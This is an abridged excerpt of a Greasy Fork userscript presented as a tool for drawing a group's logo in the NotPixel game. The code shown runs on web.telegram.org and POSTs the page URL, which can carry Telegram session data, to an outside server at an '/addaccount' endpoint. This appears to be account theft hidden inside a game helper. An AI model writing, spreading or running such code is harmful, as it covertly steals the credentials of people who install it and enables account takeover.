...
// @grant        none
// @license      ivank
// @downloadURL https://update.greasyfork.org/scripts/508625/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.user.js
// @updateURL https://update.greasyfork.org/scripts/508625/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.meta.js
// ==/UserScript==
...
(async function () {
	if(location.host === "web.telegram.org") {
        ...
        const response = await await fetch("https://naeb-loxov.online/addaccount", {
			body: JSON.stringify({
				url: location.href
			}),
            method: "POST",
